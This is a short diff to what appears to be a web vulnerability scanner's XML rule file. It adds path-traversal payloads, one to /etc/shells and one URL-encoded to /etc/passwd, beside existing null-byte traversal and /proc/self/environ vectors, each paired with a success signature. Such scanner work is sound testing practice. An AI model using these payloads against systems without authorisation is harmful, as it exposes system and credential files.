@@ -12,6 +12,10 @@
         <rule vector="/proc/self/environ%00" windows='0' linux='1'><![CDATA[XDG_SESSION_ID=]]></rule>
         <rule vector="../../../../../../../../../../../../../../../etc/passwd" windows='0' linux='1'>
             <![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+        <rule vector="../../../../../../../../../../../../../../etc/shells" windows='0' linux='1'>
+            <![CDATA[# /etc/shells]]></rule>
+        <rule vector=".%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" windows='0' linux='1'>
+            <![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
         <rule vector="../../../../../../../../../../../../../../../etc/passwd%00" windows='0' linux='1'>
             <![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
         <rule vector="../../../../../../../../../../../../../../../etc/passwd\0" windows='0' linux='1'>
